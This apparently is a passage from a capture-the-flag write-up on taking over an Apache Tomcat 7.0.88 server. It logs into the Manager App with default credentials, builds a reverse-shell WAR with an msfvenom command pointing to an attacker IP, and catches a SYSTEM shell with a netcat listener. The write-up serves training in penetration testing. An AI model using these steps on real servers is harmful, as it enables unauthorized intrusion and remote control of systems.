The root page for port 8080 takes us to an install of Apache Tomcat / 7.0.88.

When clicking on the 'Manager App' button we are asked for authentication before proceeding. Looking up the default credentials on Google we get the result below.

From the list above I tried `tomcat:s3cret` and was granted access as shown below. I have done penetration testing against Tomcat previously and know that once you have access to the Manager App you can upload a malicious WAR file in order to gain shell.

Using the command below we can create a WAR reverse shell with `msfvenom`.

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.29 LPORT=80 -f war > shell.war
```

Once uploaded we can then see the upload shell under 'Applications'.

Then start a `netcat` listener on the attacking machine:

```
sudo nc -lvp 80
```

Then click on the uploaded WAR file under applications to execute. As per below you should then have a reverse shell as SYSTEM.
